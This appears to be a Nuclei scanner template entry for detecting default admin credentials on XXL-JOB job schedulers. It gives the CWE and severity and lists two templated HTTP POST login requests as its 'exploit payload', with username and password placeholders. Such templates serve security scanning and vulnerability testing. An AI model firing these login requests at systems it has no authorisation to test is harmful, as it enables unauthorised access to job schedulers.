# Nuclei Template: XXL-JOB Default Login
**Template ID:** xxljob-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`xxljob-default-login.yaml`)

## Vulnerability Information & PoC

## Description
XXL-JOB default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /xxl-job-admin/login HTTP/1.1
Host:{{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

userName={{username}}&password={{password}}

POST /login HTTP/1.1
Host:{{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

userName={{username}}&password={{password}}
```

## References
- https://github.com/xuxueli/xxl-job
